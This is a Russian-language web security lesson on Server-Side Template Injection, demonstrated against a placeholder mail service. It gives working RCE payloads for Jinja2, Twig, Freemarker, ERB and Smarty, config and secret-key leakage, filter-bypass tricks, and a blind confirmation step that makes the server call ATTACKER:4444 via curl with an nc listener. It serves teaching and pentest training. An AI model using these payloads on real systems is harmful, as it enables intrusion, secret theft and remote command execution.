## Вопрос, с которого всё начинается

Ты вводишь имя в поле «Подпись в письме», а сервер подставляет его в готовое письмо: «Здравствуйте, Иван!». Чтобы вставлять такие значения, серверные программы используют **шаблонизатор** — движок, который берёт текст с «дырками» и заполняет их данными.

Вопрос: что, если сервер вставит твоё значение **в сам шаблон** — то есть твой текст станет частью программы, которую движок выполнит? Тогда ты сможешь выполнить на сервере свой код. Это называется **SSTI** (Server-Side Template Injection), и это прямой путь к RCE. Сегодня пройдём его на одной форме генерации письма.

## Наш пример

Есть сервис рассылки `mailmerge.example`. У него есть эндпоинт, который рендерит письмо с именем из параметра `name`. Отправляем обычное значение и смотрим ответ:

```bash
$ curl -s 'https://mailmerge.example/render?name=Иван'
Здравствуйте, Иван!
```

Пока всё обычно. Теперь отправим **выражение**, а не текст. В синтаксисе Jinja2 (популярный шаблонизатор Python) выражение пишут в двойных фигурных скобках:

```bash
$ curl -s 'https://mailmerge.example/render?name={{7*7}}'
Здравствуйте, 49!
```

Мы отправили `{{7*7}}`, а сервер вернул `49`. Он **вычислил** наше выражение. Значит, движок выполнил наш текст как код — SSTI подтверждён. Это уже серьёзно, потому что от арифметики можно дойти до команд ОС.

## Шаг 1: определяем, какой это движок

У разных языков — разные шаблонизаторы, и payload для одного не сработает в другом. Jinja2 и Twig внешне похожи (`{{ }}`), но отличаются. Есть классический трюк: умножение строки на число.

```bash
$ curl -s "https://mailmerge.example/render?name={{7*'7'}}"
Здравствуйте, 7777777!
```

Jinja2 в Python «умножает» строку `'7'` на 7 и получает `7777777`. Twig (PHP) дал бы `49` — он приводит строку к числу. Значит, у нас **Jinja2**, то есть сервер написан на Python (вероятно, Flask). Теперь мы знаем, какую цепочку строить.

## Шаг 2: сначала простые утечки, а не сразу RCE

Прежде чем строить сложный вызов команды, проверим объекты, которые Jinja2 даёт «бесплатно». В Flask есть объект `config` — конфигурация приложения:

```bash
$ curl -s 'https://mailmerge.example/render?name={{config}}'
<Config {'SECRET_KEY': 'super-secret-key', 'DEBUG': True, 'SQLALCHEMY_DATABASE_URI': 'mysql://app:...'}>
```

Один запрос — и у нас `SECRET_KEY` (им подписываются сессионные cookie; с ним можно подделать сессию админа) и строка подключения к базе. Часто на этом этапе уже достаточно для полного компромисса.

## Шаг 3: идём к выполнению команд

`SECRET_KEY` — хорошо, но «проверка» RCE — это вывод команды `id`. В Python любой объект знает свой класс. Возьмём пустую строку и посмотрим её класс:

```bash
$ curl -s "https://mailmerge.example/render?name={{''.__class__}}"
<class 'str'>
```

`__class__` — это встроенный атрибут Python: он возвращает класс объекта. У `str` есть список всех подклассов, среди которых есть `subprocess.Popen` — класс, запускающий команды ОС. Найдём его индекс:

```bash
$ curl -s "https://mailmerge.example/render?name={{''.__class__.__mro__[1].__subclasses__()}}" \
  | tr ',' '\n' | grep -n 'subprocess.Popen'
414: <class 'subprocess.Popen'>
```

`__mro__` — цепочка наследования классов; `[1]` берёт базовый класс `object`, а `__subclasses__()` перечисляет всех его потомков. Теперь вызовем `Popen` по индексу 414:

```bash
$ curl -s "https://mailmerge.example/render?name={{''.__class__.__mro__[1].__subclasses__()[414]('id',shell=True,stdout=-1).communicate()}}"
(b'uid=1000(app) gid=1000(app) groups=1000(app)', None)
```

`uid=1000(app)` — команда выполнена на сервере. Артефакт получен.

## Шаг 4: короткий путь через глобальные объекты

Перебирать индексы утомительно, а у Jinja2 есть готовые объекты, доступные в шаблоне: `lipsum`, `cycler`, `joiner`. У них есть `__globals__` — словарь глобальных переменных модуля, где лежит модуль `os`:

```bash
$ curl -s "https://mailmerge.example/render?name={{lipsum.__globals__['os'].popen('id').read()}}"
uid=1000(app) gid=1000(app) groups=1000(app)
```

То же самое короче и надёжнее. Модуль `os.popen` запускает команду и возвращает её вывод. Если `lipsum` недоступен — `cycler.__init__.__globals__.os.popen('id').read()`.

## Шаг 5: если движок другой

У каждого движка своя цепочка. Фингерпринт и короткий RCE для популярных:

| Движок | Фингерпринт | Цепочка к RCE |
|--------|-------------|---------------|
| Jinja2 (Python) | `{{7*'7'}}` → `7777777` | `lipsum.__globals__.os.popen('id').read()` |
| Twig (PHP) | `{{7*'7'}}` → `49` | `{{['id']\|map('system')\|join}}` |
| Freemarker (Java) | `${7*7}` → `49` | `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}` |
| ERB (Ruby) | `<%= 7*7 %>` → `49` | `<%= \`id\` %>` |
| Smarty (PHP) | `{7*7}` → `49` | `{system('id')}` |

Например, для Freemarker отправим `${7*7}`:

```bash
$ curl -s 'https://mailmerge.example/render?name=${7*7}'
Здравствуйте, ${7*7}!
```

Не вычислилось — значит, это не Java-движок. Всегда сначала определяем движок, потом берём цепочку.

## Шаг 6: обход фильтров

Иногда WAF или сама программа вырезают опасные символы. Частые обходы:

- **запрещена `.`** → `{{''|attr('__class__')}}` — фильтр `attr` берёт атрибут по строке;
- **запрещены `{{ }}`** → `{%print(7*7)%}` — блоки `{% %}`;
- **запрещены слова** → собираем их конкатенацией: `{{lipsum['__glo'+'bals__']...}}`.

Смысл один: собрать то же выражение другим синтаксисом.

## Шаг 7: если ответ пустой (blind-случай)

Иногда выражение вычисляется, но результат не виден: например, вывод `id` уходит в лог, а не в ответ. Тогда действуют в два приёма. Первый — вынести вывод в место, которое ты контролируешь: `{{lipsum.__globals__['os'].popen('id').read()}}` может попасть в письмо, которое придёт тебе. Второй — заставить сервер обратиться к твоему listener: разверни у себя `nc -lvnp 4444` и попроси сервер дёрнуть `curl` на него:

```bash
# у себя: слушаем порт
$ nc -lvnp 4444
# на цели: заставляем сервер постучаться к нам
$ curl -s "https://mailmerge.example/render?name={{lipsum.__globals__['os'].popen('curl http://ATTACKER:4444/x').read()}}"
```

Если к тебе пришёл запрос — код на сервере точно выполнился, даже без видимого вывода. Это называют **OOB** (out-of-band) подтверждением.

## Что мы теперь знаем

- SSTI — когда твой ввод становится **кодом шаблона** и выполняется на сервере.
- Подтверждение — арифметика: `{{7*7}}` → `49`.
- Движок определяют по `{{7*'7'}}`: `7777777` — Jinja2, `49` — Twig.
- Простые утечки (`{{config}}`) часто дают `SECRET_KEY` до всякого RCE.
- В Python RCE — через `lipsum.__globals__['os'].popen(...)` или `subclasses()` → `Popen`.
- Артефакт — вывод `id`, а не «выражение посчиталось».
- Универсального payload нет: сначала движок, потом цепочка.

## На что смотреть дальше

- **Смотри, куда именно попадает ввод:** внутрь `{{ }}`, внутрь строки шаблона или в `{% %}`. От этого зависит payload.
- **Не путай SSTI и XSS.** `{{7*7}}` → `49` в ответе — это серверная инъекция; если бы вернулось `{{7*7}}` и его исполнил браузер — это уже другое.
- **Клиентские шаблонизаторы** (Handlebars/Angular в браузере) — это DOM-XSS, синтаксис похож, но выполняется у пользователя, а не на сервере.
- **SandboxedEnvironment** в Jinja2 блокирует `__`-атрибуты — ищи разрешённые объекты (`cycler`, `lipsum`, `request`).
- **Инструмент `tplmap`** автоматизирует обнаружение и эксплуатацию, но проверяй его вывод руками.
- **Только чтение на первом шаге.** `id`/`cat /etc/hostname` достаточно для доказательства; не выполняй разрушительных команд.

## Куда дальше

В следующем уроке мы разберём родственную семью инъекций — **SSI и XSLT**, где сервер обрабатывает твои директивы или XSL-преобразования и тоже доходит до выполнения кода. А пока главное запомни: если твой текст вернулся **вычисленным** — ты уже исполняешь код на сервере.

## Где пригодится

- **CTF (Web):** SSTI — любимый класс задач на RCE; часто достаточно `{{config}}` или цепочки `lipsum`/`cycler`.
- **Bug bounty:** SSTI критичен (RCE), встречается в генераторах писем/PDF/отчётов, где имя пользователя попадает в шаблон.
- **Пентест:** обязательный тест полей, попадающих в генерацию документов/уведомлений.
- **Работа (AppSec):** «не конкатенируй ввод в шаблон», sandboxing, обновление движков — меры против SSTI.
